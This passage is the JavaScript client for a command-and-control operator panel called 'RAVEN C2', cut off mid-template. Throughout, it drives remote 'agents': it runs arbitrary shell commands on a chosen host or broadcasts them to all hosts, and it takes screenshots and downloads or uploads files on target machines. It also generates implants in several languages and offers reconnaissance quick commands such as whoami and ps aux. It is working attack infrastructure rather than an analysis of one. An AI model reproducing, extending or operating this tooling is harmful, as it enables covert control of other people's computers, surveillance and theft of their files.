"use strict";

const State = {
  serverRunning: false,
  serverHost: "0.0.0.0",
  serverPort: 4444,
  serverAddress: "",
  sessionKey: "",
  serverStartedAt: null,
  uptime: "",
  agentList: [],
  selectedId: null,
  logs: [],
  lastLogCount: 0,
  lastScrollY: 0,
  busy: false,
  token: null,
  operator: null,
  role: null,
  isTeam: false,
};

let pollTimer = null;
let clockTimer = null;
let uptimeTimer = null;

const QuickCmds = [
  { cmd: "SYSINFO", icon: "fas fa-info-circle", label: "Sysinfo" },
  { cmd: "ls -la", icon: "fas fa-folder-open", label: "List Files" },
  { cmd: "ifconfig", icon: "fas fa-network-wired", label: "Network" },
  { cmd: "whoami", icon: "fas fa-user", label: "Whoami" },
  { cmd: "ps aux", icon: "fas fa-tasks", label: "Processes" },
  { cmd: "SCREENSHOT", icon: "fas fa-camera", label: "Screenshot" },
  { cmd: "id", icon: "fas fa-id-badge", label: "ID" },
];

// ── Token helpers ─────────────────────────────────────────────────────────────

function LoadToken() {
  try {
    State.token = localStorage.getItem("tc2_token");
    State.operator = localStorage.getItem("tc2_operator");
    State.role = localStorage.getItem("tc2_role");
  } catch (e) {}
}

function SaveToken(token, operator, role) {
  State.token = token;
  State.operator = operator;
  State.role = role;
  try {
    localStorage.setItem("tc2_token", token);
    localStorage.setItem("tc2_operator", operator);
    localStorage.setItem("tc2_role", role);
  } catch (e) {}
}

function ClearToken() {
  State.token = null;
  State.operator = null;
  State.role = null;
  try {
    localStorage.removeItem("tc2_token");
    localStorage.removeItem("tc2_operator");
    localStorage.removeItem("tc2_role");
  } catch (e) {}
}

function AuthHdr(extra) {
  let h = Object.assign({ "Content-Type": "application/json" }, extra || {});
  if (State.token) h["Authorization"] = "Bearer " + State.token;
  return h;
}

// ── API wrapper ───────────────────────────────────────────────────────────────

async function Api(path, opts) {
  opts = opts || {};
  opts.headers = AuthHdr(opts.headers);
  let r = await fetch(path, opts);
  if (r.status === 401) {
    ClearToken();
    ShowLogin("Session expired");
    throw new Error("Unauthorized");
  }
  return r;
}

// ── Login modal (TeamServer only) ─────────────────────────────────────────────

function ShowLogin(msg) {
  let old = document.getElementById("login-overlay");
  if (old) old.remove();
  let Ov = document.createElement("div");
  Ov.id = "login-overlay";
  Ov.style.cssText =
    "position:fixed;inset:0;background:rgba(8,10,16,0.96);display:flex;" +
    "align-items:center;justify-content:center;z-index:9999;";
  Ov.innerHTML = `
    <div style="background:#0f1621;border:1px solid rgba(180,40,40,0.35);border-radius:12px;
                padding:40px 36px;width:340px;max-width:94vw;text-align:center;">
      <div style="font-family:'Tourney',monospace;font-size:22px;color:#c8293e;
                  letter-spacing:4px;margin-bottom:4px;">RAVEN C2</div>
      <div style="font-size:10px;color:#475569;letter-spacing:2px;margin-bottom:26px;">
        TEAMSERVER — OPERATOR AUTHENTICATION</div>
      ${msg ? `<div style="color:#f87171;font-size:12px;margin-bottom:14px;">${Esc(msg)}</div>` : ""}
      <input id="li-user" type="text" placeholder="Username" autocomplete="off"
        style="width:100%;box-sizing:border-box;background:#1e2335;border:1px solid rgba(180,40,40,0.25);
               border-radius:6px;padding:10px 14px;color:#e2e8f0;font-size:13px;margin-bottom:10px;outline:none;">
      <input id="li-pass" type="password" placeholder="Password"
        style="width:100%;box-sizing:border-box;background:#1e2335;border:1px solid rgba(180,40,40,0.25);
               border-radius:6px;padding:10px 14px;color:#e2e8f0;font-size:13px;margin-bottom:18px;outline:none;">
      <button id="li-btn" onclick="DoLogin()"
        style="width:100%;background:#c8293e;color:#fff;border:none;border-radius:6px;
               padding:11px;font-weight:700;font-size:13px;cursor:pointer;letter-spacing:1px;">
        AUTHENTICATE</button>
      <div id="li-err" style="color:#f87171;font-size:12px;margin-top:12px;min-height:16px;"></div>
    </div>`;
  document.body.appendChild(Ov);
  let u = document.getElementById("li-user");
  let p = document.getElementById("li-pass");
  if (u) {
    u.focus();
    u.onkeydown = (e) => {
      if (e.key === "Enter") p && p.focus();
    };
  }
  if (p)
    p.onkeydown = (e) => {
      if (e.key === "Enter") DoLogin();
    };
}

async function DoLogin() {
  let u = (document.getElementById("li-user") || {}).value || "";
  let p = (document.getElementById("li-pass") || {}).value || "";
  let e = document.getElementById("li-err");
  let b = document.getElementById("li-btn");
  if (!u || !p) {
    if (e) e.textContent = "Username and password required";
    return;
  }
  if (b) {
    b.disabled = true;
    b.textContent = "Authenticating...";
  }
  try {
    let r = await fetch("/api/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ Username: u, Password: p }),
    });
    let d = await r.json();
    if (d.Token) {
      SaveToken(d.Token, d.Username, d.Role);
      let ov = document.getElementById("login-overlay");
      if (ov) ov.remove();
      Log("Logged in as " + d.Username + " [" + d.Role + "]", "success");
      UpdateBadge();
      await BootStatus();
    } else {
      if (e) e.textContent = d.Error || "Invalid credentials";
    }
  } catch (err) {
    if (e) e.textContent = "Connection error";
  } finally {
    if (b) {
      b.disabled = false;
      b.textContent = "AUTHENTICATE";
    }
  }
}

async function DoLogout() {
  try {
    await Api("/api/auth/logout", { method: "POST" });
  } catch (e) {}
  ClearToken();
  StopPoll();
  StopUptime();
  State.serverRunning = false;
  State.agentList = [];
  State.selectedId = null;
  ShowLogin("Logged out");
}

function UpdateBadge() {
  let b = document.getElementById("op-badge");
  let lb = document.getElementById("logout-btn");
  if (b) {
    if (State.operator) {
      b.style.display = "";
      b.textContent = State.operator + " [" + (State.role || "?") + "]";
    } else b.style.display = "none";
  }
  if (lb) lb.style.display = State.operator ? "" : "none";
}

// ── Utilities ─────────────────────────────────────────────────────────────────

function Esc(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function CopyText(text, btn) {
  let done = () => {
    if (!btn) return;
    let o = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-check"></i>';
    btn.disabled = true;
    setTimeout(() => {
      btn.innerHTML = o;
      btn.disabled = false;
    }, 1800);
  };
  if (navigator.clipboard && window.isSecureContext)
    navigator.clipboard
      .writeText(text)
      .then(done)
      .catch(() => {
        FbCopy(text);
        done();
      });
  else {
    FbCopy(text);
    done();
  }
}

function FbCopy(text) {
  let t = document.createElement("textarea");
  t.value = text;
  t.style.cssText = "position:fixed;opacity:0";
  document.body.appendChild(t);
  t.focus();
  t.select();
  try {
    document.execCommand("copy");
  } catch (e) {}
  document.body.removeChild(t);
}

// ── Navigation ────────────────────────────────────────────────────────────────

function GoTo(sec) {
  document
    .querySelectorAll(".section")
    .forEach((el) => el.classList.remove("active"));
  let t = document.getElementById("section-" + sec);
  if (t) t.classList.add("active");
  document
    .querySelectorAll("[data-nav]")
    .forEach((el) => el.classList.toggle("active", el.dataset.nav === sec));
  let titles = {
    dashboard: "Dashboard",
    server: "Server",
    agents: "Agents",
    command: "Console",
    logs: "Logs",
    team: "Team",
    about: "About",
  };
  ["mobile-title", "topbar-title"].forEach((id) => {
    let el = document.getElementById(id);
    if (el) el.textContent = titles[sec] || sec;
  });
  if (typeof closeSidebar === "function") closeSidebar();
  if (sec === "agents") DrawTopology();
  if (sec === "team") LoadTeam();
}

// ── Clock + Uptime ─────────────────────────────────────────────────────────────

function TickClock() {
  let t = new Date().toLocaleTimeString("en-US", { hour12: false });
  ["topnav-clock", "mobile-clock"].forEach((id) => {
    let el = document.getElementById(id);
    if (el) el.textContent = t;
  });
}

function TickUptime() {
  if (!State.serverStartedAt || !State.serverRunning) return;
  let s = Math.floor(Date.now() / 1000 - State.serverStartedAt);
  let str = `${String(Math.floor(s / 3600)).padStart(2, "0")}:${String(Math.floor((s % 3600) / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;
  let el = document.getElementById("stat-uptime");
  if (el) el.textContent = str;
  uptimeTimer = setTimeout(TickUptime, 1000 - (Date.now() % 1000) || 1000);
}

function StartUptime() {
  if (uptimeTimer) clearTimeout(uptimeTimer);
  TickUptime();
}
function StopUptime() {
  if (uptimeTimer) {
    clearTimeout(uptimeTimer);
    uptimeTimer = null;
  }
  let el = document.getElementById("stat-uptime");
  if (el) el.textContent = "00:00:00";
}

// ── Server UI ─────────────────────────────────────────────────────────────────

function UpdateSphere() {
  let up = State.serverRunning;
  let w = document.getElementById("sphere-wrap");
  if (w) w.classList.toggle("online", up);
  let p = document.querySelector(".sphere-pulse");
  if (p) p.classList.toggle("active", up);
  let v = document.getElementById("sphere-val");
  if (v) {
    v.textContent = up ? "ONLINE" : "OFFLINE";
    v.classList.toggle("online", up);
  }
  let d = document.getElementById("sphere-detail");
  if (d)
    d.textContent = up
      ? "Listening on " + State.serverAddress
      : "Server not running";
}

function UpdateStats() {
  let sv = document.getElementById("stat-server-status");
  if (sv) {
    sv.className = "stat-val " + (State.serverRunning ? "online" : "offline");
    sv.innerHTML =
      '<span class="dot' +
      (State.serverRunning ? " online" : "") +
      '"></span>' +
      (State.serverRunning ? "Online" : "Offline");
  }
  let ae = document.getElementById("stat-agents");
  if (ae) ae.textContent = State.agentList.length;
  let ce = document.getElementById("stat-connections");
  if (ce) ce.textContent = State.agentList.length;
  ["server-address-val", "server-address-val2"].forEach((id) => {
    let el = document.getElementById(id);
    if (el) el.textContent = State.serverAddress || "—";
  });
  ["session-key-val", "session-key-val2"].forEach((id) => {
    let el = document.getElementById(id);
    if (el)
      el.textContent = State.sessionKey
        ? State.sessionKey.substring(0, 32) + "…"
        : "—";
  });
}

function UpdateToggleBtns() {
  let up = State.serverRunning;
  document
    .querySelectorAll(".server-toggle")
    .forEach((b) => b.classList.toggle("online", up));
  let cb = document.getElementById("server-toggle-btn");
  if (cb)
    cb.innerHTML = up
      ? '<i class="fas fa-stop"></i> Stop Server'
      : '<i class="fas fa-play"></i> Start Server';
}

function UpdateAgentBadges() {
  let n = State.agentList.length;
  document.querySelectorAll(".agent-count-badge").forEach((el) => {
    el.textContent = n;
    el.style.display = n ? "" : "none";
  });
}

// ── Agents ────────────────────────────────────────────────────────────────────

function RenderAgents() {
  let c = document.getElementById("agent-cards");
  if (!c) return;
  if (!State.agentList.length) {
    c.innerHTML =
      '<div class="empty-state"><i class="fas fa-satellite-dish"></i><div class="empty-title">NO ACTIVE AGENTS</div><div class="empty-text">Waiting for agents to connect...</div></div>';
    return;
  }
  c.innerHTML = State.agentList
    .map((a) => {
      let name = Esc(a.DisplayName || a.AgentName || "AGENT-" + a.ID);
      let sel = State.selectedId === a.ID;
      return `<div class="agent-card${sel ? " selected" : ""}" data-id="${a.ID}">
          <div class="agent-id">[ ${name} ]</div>
          <div class="agent-meta">
            <span class="mk">ID#</span><span class="mv">${Esc(String(a.ID))}</span>
            <span class="mk">HOST</span><span class="mv">${Esc(a.Hostname || "—")}</span>
            <span class="mk">OS</span><span class="mv">${Esc(a.OS || "—")}</span>
            <span class="mk">IP</span><span class="mv">${Esc(a.AgentIP || "—")}</span>
            <span class="mk">USER</span><span class="mv">${Esc(a.User || "—")}</span>
            <span class="mk">ENC</span><span class="mv">${a.Encrypted ? "YES" : "NO"}</span>
            <span class="mk">KEY</span><span class="mv" style="font-size:9px;word-break:break-all;">${Esc((a.SessionKey || "—").substring(0, 20))}…</span>
          </div>
          <div style="display:flex;gap:6px;margin-top:8px;">
            <button class="btn sm full" onclick="SelectAndGo(${a.ID})"><i class="fas fa-crosshairs"></i> Target</button>
            <button class="btn sm btn-outline-red" onclick="KillAgent(${a.ID})" title="Kill session"><i class="fas fa-times"></i></button>
          </div>
        </div>`;
    })
    .join("");
  c.querySelectorAll(".agent-card").forEach((card) => {
    card.addEventListener("click", (e) => {
      if (e.target.closest("button")) return;
      SelectAgent(parseInt(card.dataset.id));
    });
  });
}

function UpdateTargetBadge() {
  let b = document.getElementById("target-badge");
  if (!b) return;
  if (State.selectedId != null) {
    let a = State.agentList.find((x) => x.ID === State.selectedId);
    let name = a
      ? a.DisplayName || a.AgentName || "AGENT-" + State.selectedId
      : "AGENT-" + State.selectedId;
    b.className = "target-badge";
    b.innerHTML =
      '<i class="fas fa-dot-circle"></i> ' +
      Esc(name) +
      " #" +
      State.selectedId;
  } else {
    b.className = "target-badge none";
    b.innerHTML = '<i class="fas fa-dot-circle"></i> NONE SELECTED';
  }
}

function SelectAgent(id) {
  State.selectedId = id;
  RenderAgents();
  UpdateTargetBadge();
}
function SelectAndGo(id) {
  SelectAgent(id);
  GoTo("command");
}

async function KillAgent(id) {
  if (!confirm("Kill session " + id + "?")) return;
  try {
    let r = await Api("/api/agents/kill", {
      method: "POST",
      body: JSON.stringify({ AgentId: id }),
    });
    let d = await r.json();
    if (d.Success) {
      Log("Session-" + id + " killed", "warn");
      if (State.selectedId === id) {
        State.selectedId = null;
        UpdateTargetBadge();
      }
    } else {
      Log("Kill failed: " + (d.Error || d.Message), "error");
    }
  } catch (e) {
    if (e.message !== "Unauthorized") Log("Kill error: " + e.message, "error");
  }
}

// ── Server start/stop ─────────────────────────────────────────────────────────

async function ToggleServer() {
  if (State.busy) return;
  State.busy = true;
  try {
    State.serverRunning ? await StopSrv() : await StartSrv();
  } finally {
    setTimeout(() => (State.busy = false), 1500);
  }
}

async function StartSrv() {
  let h =
    (document.getElementById("input-host") || {}).value || State.serverHost;
  let p = parseInt(
    (document.getElementById("input-port") || {}).value || State.serverPort,
  );
  State.serverHost = h;
  State.serverPort = p;
  Log("Starting server on " + h + ":" + p + "...", "info");
  try {
    let r = await Api("/api/server/start", {
      method: "POST",
      body: JSON.stringify({ Host: h, Port: p }),
    });
    let d = await r.json();
    if (d.Success) {
      State.serverRunning = true;
      State.serverAddress = d.Host + ":" + d.Port;
      State.sessionKey = d.Key || "";
      State.serverStartedAt = d.StartedAt || Date.now() / 1000;
      Log("Server started on " + State.serverAddress, "success");
      StartPoll();
      StartUptime();
      UpdateToggleBtns();
      UpdateSphere();
      UpdateStats();
    } else {
      Log("Error: " + (d.Error || d.Message || "Unknown"), "error");
    }
  } catch (e) {
    if (e.message !== "Unauthorized") Log("API error: " + e.message, "error");
  }
}

async function StopSrv() {
  Log("Stopping server...", "warn");
  try {
    let r = await Api("/api/server/stop", { method: "POST" });
    let d = await r.json();
    if (d.Success) {
      State.serverRunning = false;
      State.serverAddress = "";
      State.sessionKey = "";
      State.agentList = [];
      State.selectedId = null;
      State.lastLogCount = 0;
      Log("Server stopped", "warn");
      StopPoll();
      StopUptime();
      UpdateToggleBtns();
      UpdateSphere();
      UpdateStats();
      RenderAgents();
      UpdateTargetBadge();
      DrawTopology();
    } else {
      Log("Stop error: " + (d.Error || d.Message), "error");
    }
  } catch (e) {
    if (e.message !== "Unauthorized") Log("API error: " + e.message, "error");
  }
}

// ── Server command input (web UI) ─────────────────────────────────────────────

async function RunServerCmd() {
  let inp = document.getElementById("srv-cmd-input");
  let raw = inp ? inp.value.trim() : "";
  if (!raw) return;
  if (inp) inp.value = "";
  let parts = raw.match(/(?:[^\s"]+|"[^"]*")+/g) || [];
  let cmd = (parts[0] || "").toLowerCase();
  Log("[SERVER] > " + raw, "info");
  try {
    switch (cmd) {
      case "kill": {
        let id = parseInt(parts[1]);
        if (!id) {
          Log("[!] Usage: kill <id>", "error");
          break;
        }
        let d = await (
          await Api("/api/agents/kill", {
            method: "POST",
            body: JSON.stringify({ AgentId: id }),
          })
        ).json();
        Log(
          d.Success
            ? "[+] Killed session-" + id
            : "[!] " + (d.Error || "Failed"),
          d.Success ? "success" : "error",
        );
        break;
      }
      case "sessions":
      case "agents": {
        let d = await (await Api("/api/agents")).json();
        if (!(d.Agents || []).length) {
          Log("  ⚠ No active sessions");
          break;
        }
        (d.Agents || []).forEach((a) =>
          Log(
            "  #" +
              a.ID +
              "  " +
              (a.DisplayName || a.AgentName || "?") +
              "  " +
              a.Type +
              "  " +
              a.User +
              "@" +
              a.Hostname +
              "  " +
              a.OS +
              "  key=" +
              (a.SessionKey || "—"),
          ),
        );
        break;
      }
      case "status": {
        let d = await (await Api("/api/server/status")).json();
        Log(
          "  Status:" +
            d.Status +
            "  Mode:" +
            d.Mode +
            "  Address:" +
            d.Host +
            ":" +
            d.Port +
            "  Sessions:" +
            d.Agents +
            "  DB:" +
            d.DB,
        );
        break;
      }
      case "exec": {
        let id = parseInt(parts[1]);
        let execCmd = parts.slice(2).join(" ");
        if (!id || !execCmd) {
          Log("[!] Usage: exec <id> <cmd>", "error");
          break;
        }
        let d = await (
          await Api("/api/command/execute", {
            method: "POST",
            body: JSON.stringify({
              AgentId: id,
              Command: execCmd,
              Operator: State.operator || "system",
            }),
          })
        ).json();
        Log(
          (d.Success ? "    [+] " : "    [!] ") + d.Output,
          d.Success ? "success" : "error",
        );
        break;
      }
      case "broadcast": {
        let rawFull = raw.replace(/^broadcast\s*/i, "");
        if (!rawFull) {
          Log("[!] Usage: broadcast <all|id1,id2,...> <cmd>", "error");
          break;
        }
        let tgt = parts[1] || "";
        let bcmd = parts.slice(2).join(" ");
        if (!bcmd) {
          Log("[!] Usage: broadcast <all|ids> <cmd>", "error");
          break;
        }
        let endpoint =
          tgt.toLowerCase() === "all"
            ? "/api/command/broadcastall"
            : "/api/command/broadcast";
        let body =
          tgt.toLowerCase() === "all"
            ? { Command: bcmd, Operator: State.operator || "system" }
            : {
                AgentIds: tgt.split(",").map(Number),
                Command: bcmd,
                Operator: State.operator || "system",
              };
        let d = await (
          await Api(endpoint, { method: "POST", body: JSON.stringify(body) })
        ).json();
        Object.entries(d.Results || {}).forEach(([id, v]) =>
          Log(
            "  [" + id + "] " + (v.Success ? "✔ " : "✘ ") + (v.Output || ""),
            v.Success ? "success" : "error",
          ),
        );
        break;
      }
      case "screenshot": {
        let id = parseInt(parts[1]) || State.selectedId;
        if (!id) {
          Log("[!] Usage: screenshot <id>", "error");
          break;
        }
        let d = await (
          await Api("/api/command/screenshot", {
            method: "POST",
            body: JSON.stringify({
              AgentId: id,
              Operator: State.operator || "system",
            }),
          })
        ).json();
        Log(
          (d.Success ? "    [+] " : "    [!] ") + d.Output,
          d.Success ? "success" : "error",
        );
        break;
      }
      case "download":
      case "dl": {
        let id = parseInt(parts[1]);
        let path = parts.slice(2).join(" ");
        if (!id || !path) {
          Log("[!] Usage: download <id> <remote-path>", "error");
          break;
        }
        let d = await (
          await Api("/api/command/download", {
            method: "POST",
            body: JSON.stringify({
              AgentId: id,
              Path: path,
              Operator: State.operator || "system",
            }),
          })
        ).json();
        Log(
          (d.Success ? "    [+] " : "    [!] ") + d.Output,
          d.Success ? "success" : "error",
        );
        break;
      }
      case "upload": {
        let id = parseInt(parts[1]);
        let local = parts[2] || "";
        let remote = parts[3] || "";
        if (!id || !local) {
          Log("[!] Usage: upload <id> <local-path> [remote-path]", "error");
          break;
        }
        let d = await (
          await Api("/api/command/upload", {
            method: "POST",
            body: JSON.stringify({
              AgentId: id,
              LocalPath: local,
              RemotePath: remote,
              Operator: State.operator || "system",
            }),
          })
        ).json();
        Log(
          (d.Success ? "    [+] " : "    [!] ") + d.Output,
          d.Success ? "success" : "error",
        );
        break;
      }
      case "listopt":
      case "operators": {
        let d = await (await Api("/api/team/operators")).json();
        (d.Operators || []).forEach((op) =>
          Log(
            "  " +
              op.Username.padEnd(16) +
              "  " +
              (op.Role || "?").padEnd(10) +
              "  " +
              (op.LastSeen || "Never"),
          ),
        );
        break;
      }
      case "history": {
        let id = parseInt(parts[1]) || 0;
        let lim = parseInt(parts[2]) || 50;
        let d = await (
          await Api("/api/command/history", {
            method: "POST",
            body: JSON.stringify({ AgentId: id, Limit: lim }),
          })
        ).json();
        (d.History || []).forEach((h) =>
          Log(
            "  [" +
              (h.Timestamp || "") +
              "] #" +
              h.AgentId +
              " " +
              (h.Operator || "?") +
              " » " +
              h.Command,
          ),
        );
        break;
      }
      case "chathistory": {
        let d = await (
          await Api("/api/team/chat/history", {
            method: "POST",
            body: JSON.stringify({ Limit: 50 }),
          })
        ).json();
        (d.Chat || []).forEach((m) =>
          Log(
            "  [" +
              (m.timestamp || "") +
              "] " +
              m.from_operator +
              " → " +
              (m.to_operators || "all") +
              ": " +
              m.message,
          ),
        );
        break;
      }
      case "agentgen":
      case "genagent": {
        // agentgen <id> [host] [port] [lang=java|python|go|bash] [mtls]
        let agId = parts[1] || "agent-" + Date.now();
        let agHost = parts[2] || "";
        let agPort = parseInt(parts[3]) || 0;
        let agLang = parts[4] || "java";
        let agMtls = (parts[5] || "").toLowerCase() === "mtls";
        let body = { AgentId: agId, Lang: agLang, Mtls: agMtls };
        if (agHost) body.Host = agHost;
        if (agPort) body.Port = agPort;
        let d = await (
          await Api("/api/agent/gen", {
            method: "POST",
            body: JSON.stringify(body),
          })
        ).json();
        if (d.Success) {
          Log("[+] Agent generated: " + d.AgentId, "success");
          Log("    Output: " + d.OutputDir);
          Log("    Files: " + (d.Files || []).join(", "));
        } else Log("[!] " + d.Error, "error");
        break;
      }
      case "logs": {
        let d = await (await Api("/api/logs")).json();
        (d.Logs || []).slice(-30).forEach((l) => Log("  " + l));
        break;
      }
      case "help": {
        Log("  Available commands:");
        [
          "sessions/agents",
          "exec <id> <cmd>",
          "broadcast <all|ids> <cmd>",
          "kill <id>",
          "screenshot <id>",
          "download <id> <path>",
          "upload <id> <local> [remote]",
          "status",
          "history [id] [limit]",
          "listopt",
          "chathistory",
          "agentgen <id> [host] [port] [lang] [mtls]",
          "logs",
          "help",
        ].forEach((c) => Log("    " + c));
        break;
      }
      default:
        Log("[!] Unknown: " + cmd + " — type 'help' for commands", "error");
    }
  } catch (e) {
    if (e.message !== "Unauthorized") Log("[!] " + e.message, "error");
  }
}

// ── Polling ───────────────────────────────────────────────────────────────────

function StartPoll() {
  if (pollTimer) clearInterval(pollTimer);
  pollTimer = setInterval(async () => {
    await PollStatus();
    await PollAgents();
    await PollLogs();
  }, 1500);
}

function StopPoll() {
  if (pollTimer) {
    clearInterval(pollTimer);
    pollTimer = null;
  }
}

async function PollStatus() {
  try {
    let d = await (await Api("/api/server/status")).json();
    if (d.Status === "Online") {
      State.serverRunning = true;
      if (d.Host && d.Port) State.serverAddress = d.Host + ":" + d.Port;
      if (d.Key) State.sessionKey = d.Key;
      if (d.StartedAt && d.StartedAt !== State.serverStartedAt) {
        State.serverStartedAt = d.StartedAt;
        StartUptime();
      } else if (!State.serverStartedAt) {
        State.serverStartedAt = Date.now() / 1000;
        StartUptime();
      }
      UpdateStats();
    } else if (d.Status === "Offline" && State.serverRunning) {
      State.serverRunning = false;
      Log("Server went offline", "error");
      StopUptime();
      UpdateToggleBtns();
      UpdateSphere();
      UpdateStats();
    }
  } catch (e) {}
}

async function PollAgents() {
  try {
    let d = await (await Api("/api/agents")).json();
    let agents = d.Agents || [];
    let cur = new Set(State.agentList.map((a) => a.ID));
    let nxt = new Set(agents.map((a) => a.ID));
    agents.forEach((a) => {
      if (!cur.has(a.ID)) {
        let name = a.DisplayName || a.AgentName || "AGENT-" + a.ID;
        Log(
          "Agent connected: [" +
            name +
            "] " +
            (a.AgentIP || "") +
            " key=" +
            (a.SessionKey || "—"),
          "success",
        );
      }
    });
    State.agentList = agents;
    RenderAgents();
    UpdateStats();
    UpdateAgentBadges();
    DrawTopology();
    if (State.selectedId && !nxt.has(State.selectedId)) {
      Log("Agent disconnected: #" + State.selectedId, "warn");
      State.selectedId = null;
      UpdateTargetBadge();
    }
  } catch (e) {}
}

async function PollLogs() {
  try {
    let d = await (await Api("/api/logs")).json();
    let svl = d.Logs || [];
    if (svl.length > State.lastLogCount) {
      svl.slice(State.lastLogCount).forEach((entry) => {
        let msg =
          typeof entry === "string" ? entry : entry.Message || String(entry);
        Log("[SERVER] " + msg);
      });
      State.lastLogCount = svl.length;
    }
  } catch (e) {}
}

// ── Logs ──────────────────────────────────────────────────────────────────────

function Log(msg, level) {
  if (!level) level = "info";
  let ts = new Date().toLocaleTimeString("en-US", { hour12: false });
  State.logs.push({ msg, level, ts });
  if (State.logs.length > 500) State.logs = State.logs.slice(-500);
  RenderLogs();
}

function RenderLogs() {
  let el = document.getElementById("log-container");
  if (!el) return;
  if (!State.logs.length) {
    el.innerHTML =
      '<div class="empty-state" style="min-height:100px"><i class="fas fa-clipboard-list"></i><div class="empty-text">No logs</div></div>';
    return;
  }
  el.innerHTML = State.logs
    .map(
      (e) =>
        `<div class="log-entry ${Esc(e.level)}"><span class="log-time">[${Esc(e.ts)}] [${Esc(e.level.toUpperCase())}]</span><span class="log-msg">${Esc(e.msg)}</span></div>`,
    )
    .join("");
  el.scrollTop = el.scrollHeight;
}

function CopyLogs(btn) {
  CopyText(
    State.logs
      .map((l) => "[" + l.ts + "] [" + l.level.toUpperCase() + "] " + l.msg)
      .join("\n"),
    btn,
  );
}
function ClearLogs() {
  State.logs = [];
  State.lastLogCount = 0;
  Api("/api/logs/clear", { method: "POST" }).catch(() => {});
  RenderLogs();
}

// ── Terminal (agent commands) ─────────────────────────────────────────────────

let CmdHistory = [],
  HistIdx = -1;

function AppendOutput(text, type) {
  let el = document.getElementById("terminal-output");
  if (!el) return;
  (text || "").split("\n").forEach((line) => {
    let d = document.createElement("div");
    d.className = "term-line " + (type || "out");
    d.textContent = line;
    el.appendChild(d);
  });
  el.scrollTop = el.scrollHeight;
}

async function ExecCmd() {
  let inp = document.getElementById("cmd-input");
  let raw = inp ? inp.value.trim() : "";
  if (!raw) return;
  if (!State.selectedId) {
    AppendOutput(
      "[!] No agent selected — go to Agents and target one first",
      "err",
    );
    return;
  }
  inp.value = "";
  CmdHistory.unshift(raw);
  if (CmdHistory.length > 50) CmdHistory.pop();
  HistIdx = -1;
  AppendOutput("> " + raw, "cmd");
  try {
    let r = await Api("/api/command/execute", {
      method: "POST",
      body: JSON.stringify({
        AgentId: State.selectedId,
        Command: raw,
        Operator: State.operator || "system",
      }),
    });
    let d = await r.json();
    AppendOutput(
      d.Success ? d.Output || "" : "[!] " + d.Output,
      d.Success ? "out" : "err",
    );
  } catch (e) {
    if (e.message !== "Unauthorized") AppendOutput("[!] " + e.message, "err");
  }
  AppendOutput("─".repeat(48), "sep");
}

function QuickCmd(cmd) {
  if (!State.selectedId) {
    AppendOutput("[!] No agent selected", "err");
    GoTo("command");
    return;
  }
  let inp = document.getElementById("cmd-input");
  if (inp) inp.value = cmd;
  ExecCmd();
}

function CopyOutput(btn) {
  let el = document.getElementById("terminal-output");
  if (!el) return;
  CopyText(
    Array.from(el.querySelectorAll(".term-line"))
      .map((l) => l.textContent)
      .join("\n"),
    btn,
  );
}

function ClearOutput() {
  let el = document.getElementById("terminal-output");
  if (el) el.innerHTML = "";
}

// ── File transfer ─────────────────────────────────────────────────────────────

async function DownloadFile() {
  let src = ((document.getElementById("adv-source") || {}).value || "").trim();
  if (!State.selectedId) {
    AppendOutput("[!] No agent selected", "err");
    return;
  }
  if (!src) {
    AppendOutput("[!] Specify source path", "err");
    return;
  }
  AppendOutput("[+] Downloading: " + src, "cmd");
  try {
    let r = await Api("/api/command/execute", {
      method: "POST",
      body: JSON.stringify({
        AgentId: State.selectedId,
        Command: "download " + src,
        Operator: State.operator || "system",
      }),
    });
    let d = await r.json();
    AppendOutput(
      d.Success ? d.Output : "[!] " + d.Output,
      d.Success ? "ok" : "err",
    );
  } catch (e) {
    AppendOutput("[!] Download failed", "err");
  }
}

async function UploadFile() {
  let src = ((document.getElementById("adv-source") || {}).value || "").trim();
  let dst = ((document.getElementById("adv-dest") || {}).value || "").trim();
  if (!State.selectedId || !src || !dst) {
    AppendOutput("[!] Select agent and provide src/dst", "err");
    return;
  }
  AppendOutput("[+] Uploading: " + src + " → " + dst, "cmd");
  try {
    let r = await Api("/api/command/execute", {
      method: "POST",
      body: JSON.stringify({
        AgentId: State.selectedId,
        Command: "upload " + dst,
        Operator: State.operator || "system",
      }),
    });
    let d = await r.json();
    AppendOutput(
      d.Success ? d.Output : "[!] " + d.Output,
      d.Success ? "ok" : "err",
    );
  } catch (e) {
    AppendOutput("[!] Upload failed", "err");
  }
}

// ── Team management ───────────────────────────────────────────────────────────

async function LoadTeam() {
  let c = document.getElementById("team-container");
  if (!c) return;
  try {
    let [opRes, roleRes] = await Promise.all([
      Api("/api/team/operators"),
      Api("/api/team/roles").catch(() => null),
    ]);
    let ops = (await opRes.json()).Operators || [];
    let roles = roleRes ? (await roleRes.json()).Roles || [] : [];

    let roleTable = roles.length
      ? `
          <div style="margin-bottom:18px;">
            <div style="font-size:10px;color:#c8293e;letter-spacing:2px;margin-bottom:8px;">ROLE PERMISSIONS</div>
            <table style="width:100%;border-collapse:collapse;font-size:11px;">
              ${roles
                .map(
                  (r) => `<tr>
                <td style="padding:5px 8px;color:#e2e8f0;font-weight:700;width:120px;">${Esc(r.Name)}</td>
                <td style="padding:5px 8px;color:#94a3b8;">${Esc(r.Permissions)}</td>
              </tr>`,
                )
                .join("")}
            </table>
          </div>`
      : "";

    let opTable = `
          <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:16px;">
            <thead><tr>
              <th style="text-align:left;padding:6px 8px;color:#c8293e;border-bottom:1px solid rgba(180,40,40,0.2);">USERNAME</th>
              <th style="text-align:left;padding:6px 8px;color:#c8293e;border-bottom:1px solid rgba(180,40,40,0.2);">ROLE</th>
              <th style="text-align:left;padding:6px 8px;color:#c8293e;border-bottom:1px solid rgba(180,40,40,0.2);">LAST SEEN</th>
              <th style="text-align:right;padding:6px 8px;color:#c8293e;border-bottom:1px solid rgba(180,40,40,0.2);">ACTIONS</th>
            </tr></thead><tbody>
            ${ops
              .map((op) => {
                let isSelf = op.Username === State.operator;
                let isAdmin = op.Username === "admin";
                return `<tr>
                  <td style="padding:6px 8px;color:#e2e8f0;">${Esc(op.Username)}${isSelf ? ' <span style="color:#c8293e;font-size:10px;">[YOU]</span>' : ""}</td>
